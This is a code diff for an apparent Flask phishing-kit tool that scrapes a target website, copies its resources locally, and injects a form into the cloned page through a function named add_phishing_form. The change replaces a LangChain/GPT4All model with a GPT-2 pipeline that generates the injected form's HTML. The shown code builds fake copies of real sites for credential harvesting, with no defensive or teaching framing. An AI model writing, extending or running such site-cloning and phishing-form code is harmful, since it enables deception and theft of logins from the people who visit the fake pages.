@@ -3,14 +3,13 @@ from bs4 import BeautifulSoup
 import os
 import requests
 import json
-from langchain import LLMChain, PromptTemplate
-from langchain.llms import GPT4All
+from transformers import pipeline
 
 app = Flask(__name__)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# Load a local language model
-llm = GPT4All(model="Meta-Llama-3-8B-Instruct.Q4_0.gguf")
+# Load a local model using HuggingFace Transformers
+generator = pipeline('text-generation', model='gpt2')
 
 def scrape_website(url):
     response = requests.get(url)
@@ -35,17 +34,16 @@ def copy_resources(soup, base_url, target_dir):
     with open(os.path.join(target_dir, 'index.html'), 'w') as file:
         file.write(str(soup))
 
-def generate_form_with_langchain():
-    template = "Generate a simple HTML form with one text input and a submit button."
-    prompt = PromptTemplate(template)
-    chain = LLMChain(prompt_template=prompt, llm=llm)
-    form_html = chain.run()
+def generate_form_with_gpt2():
+    prompt = "Generate a simple HTML form with one text input and a submit button."
+    generated = generator(prompt, max_length=50, num_return_sequences=1)
+    form_html = generated[0]['generated_text']
     return form_html
 
 def add_phishing_form(soup, target_dir):
     form = soup.find('form')
     if not form:
-        form_html = generate_form_with_langchain()
+        form_html = generate_form_with_gpt2()
         form_soup = BeautifulSoup(form_html, 'html.parser')
         soup.body.insert(0, form_soup)
     
